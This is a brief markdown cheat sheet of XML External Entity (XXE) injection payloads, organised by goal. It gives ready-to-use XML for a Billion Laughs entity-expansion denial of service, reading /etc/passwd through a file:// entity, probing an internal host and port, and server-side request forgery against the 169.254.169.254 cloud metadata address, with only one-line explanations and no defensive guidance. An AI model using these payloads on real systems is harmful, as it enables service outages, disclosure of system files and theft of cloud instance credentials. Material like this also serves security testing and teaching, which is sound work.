# XXE(XML External Entity Injection)

## Table of Contents
- [DoS](#DoS)
- [Arbitrary File Read](#Arbitrary-File-Read)
- [Reconnaisance](#Reconnaisance)
- [SSRF](#SSRF)

## DoS

### It can lead to excessive resource usage on the server, causing service interruptions.

- Billion Laughs Attack
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    ]>
    <root>&lol3;</root>
    ```

## Arbitrary File Read

### It is possible to access the file system and read sensitive information.

- LFI
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <foo>&xxe;</foo>
    ```

## Reconnaisance

### It can be used for internal network mapping.

- port scanning
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "http://192.168.0.1:8080"> 
    ]>
    <foo>&xxe;</foo>
    ```

## SSRF

### It is possible to interact with internal services.

- SSRF
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "http://169.254.169.254/">
    ]>
    <foo>&xxe;</foo>
    ```
